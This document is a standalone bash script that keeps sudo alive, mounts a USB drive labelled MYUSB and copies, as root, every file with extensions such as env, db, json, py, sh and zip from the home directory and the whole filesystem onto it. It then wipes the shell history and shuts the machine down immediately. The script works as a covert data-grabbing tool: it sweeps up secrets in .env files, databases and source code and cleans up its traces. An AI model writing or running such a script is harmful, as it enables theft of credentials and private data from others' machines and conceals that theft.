#!/usr/bin/env bash

# ✅ Keep sudo alive for the duration of the script
sudo -v
while true; do sudo -n true; sleep 60; kill -0 "$$" || exit; done 2>/dev/null &

USB_LABEL="MYUSB"
MOUNT_POINT="/mnt/usbdrive"
SOURCE_DIRS=( "$HOME" "/" )
EXTENSIONS=( "rs" "py" "env" "sh" "js" "toml" "json" "onnx" "txt" "ts" "log" "vscode" "idea" "DS" "gitignore" "db" "zip" "rar" )

# ✅ Find USB device path
DEVICE_PATH=$(lsblk -lp -o NAME,LABEL | grep -iw "$USB_LABEL" | awk '{print $1}' | head -n 1)

if [ -z "$DEVICE_PATH" ]; then
    echo "❌ USB device with label '$USB_LABEL' not found."
    exit 1
fi

# ✅ Unmount if already mounted
mountpoint -q "$MOUNT_POINT" && sudo umount "$MOUNT_POINT"

# ✅ Create mount point and mount USB
sudo mkdir -p "$MOUNT_POINT"
sudo mount -t auto "$DEVICE_PATH" "$MOUNT_POINT" || {
    echo "❌ Failed to mount $DEVICE_PATH."
    exit 1
}

# ✅ Avoid copying into USB again
EXCLUDE_PATHS=(
  "$MOUNT_POINT"
  "/proc"
  "/sys"
  "/dev"
  "/boot"
  "/run/user"
)

# ✅ Build exclude logic
EXCLUDE_ARGS=()
for p in "${EXCLUDE_PATHS[@]}"; do
    EXCLUDE_ARGS+=( -path "$p" -prune -o )
done

# ✅ Copy files with selected extensions
for ext in "${EXTENSIONS[@]}"; do
    for dir in "${SOURCE_DIRS[@]}"; do
        sudo find "$dir" "${EXCLUDE_ARGS[@]}" \
            -type f -iname "*.$ext" -exec sudo cp --parents {} "$MOUNT_POINT" \;
    done
done

sync
sudo umount "$MOUNT_POINT"
# echo "✅ Done. Files copied to USB and USB safely unmounted."

# ✅ Clear history and restart
history -c && history -w && rm -f ~/.bash_history
sudo shutdown now
